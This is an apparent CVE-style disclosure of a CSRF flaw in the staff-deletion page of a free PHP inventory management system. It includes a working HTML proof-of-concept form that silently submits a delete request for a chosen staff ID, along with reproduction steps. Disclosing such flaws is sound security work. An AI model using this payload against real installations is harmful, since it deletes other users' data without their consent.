## Vulnerability Description

Free open source inventory management system v1.0 has CSRF vulnerability in /ample/index.php?page=staff_list under the site. It is an open source project from https://www.sourcecodester.com/. This vulnerability allows an attacker to execute a web script by injecting an elaborate payload of the delete_id parameter that can delete data from any member.

1. BUG_Author: xxxxfang
  
2. vendors: [Free and Open Source inventory management system php source code](https://www.sourcecodester.com/php/16741/free-and-open-source-inventory-management-system-php-source-code.html)
  
3. The program is built using the phpstudy/v8.1.1.3 and PHP/7.3.4 version;
  
4. Vulnerability location: /ample/index.php?page=staff_list


# Vulnerability Verification

POCï¼š

```js
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://localhost/ample/app/action/delete_staff.php" method="POST">
      <-- value equals the id of a member -->
      <input type="hidden" name="delete&#95;id" value="6" />
      <input type="hidden" name="delete&#95;data" value="delete&#95;data" />
      <input type="submit" value="Delete Member" />
    </form>
  </body>
</html>
```

## How to verify

Follow the steps provided by the source code author (first log in to the background management system using the default account password, then create a worker account) to build the vulnerability environment and execute the Payload provided above.

The vulnerability lies in the "Delete staff member" function, as shown below:

![image](https://github.com/xxxxfang/CVE-Apply/assets/86756456/f0cc3cd2-3921-4ffd-8310-bc9ff330df84)




Click the delete button to get the data packet, and use "delete_id" to construct POC and execute CSRF script:

![image](https://github.com/xxxxfang/CVE-Apply/assets/86756456/cf402599-39b0-4e90-b8f1-c127c10ec403)




![image](https://github.com/xxxxfang/CVE-Apply/assets/86756456/7e7deb33-823b-43ac-b776-cf89f05c3f97)




## Result:

Delete member with ID equal to 6 successfully:

![image](https://github.com/xxxxfang/CVE-Apply/assets/86756456/3967a8f5-3992-45bf-a806-ebf003869fed)
